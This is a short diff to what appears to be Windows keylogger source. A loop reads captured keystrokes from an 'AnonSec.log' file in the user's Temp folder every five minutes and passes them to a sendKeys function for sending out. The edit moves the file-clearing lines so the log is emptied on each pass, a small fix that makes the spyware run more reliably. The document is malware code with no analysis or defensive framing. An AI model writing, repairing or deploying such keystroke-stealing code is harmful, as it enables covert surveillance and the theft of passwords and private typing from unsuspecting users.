@@ -46,9 +46,9 @@ def runSend():
         time.sleep(300)
         with open("C:\\Users\\"+str(os.getlogin())+"\\AppData\\Local\\Temp\\AnonSec.log","r+") as fh:
             datah=fh.readline()
+            fh.seek(0)
+            fh.truncate()
             if datah:
-                fh.seek(0)
-                fh.truncate()
                 sendKeys(datah)
 
 checkModules()
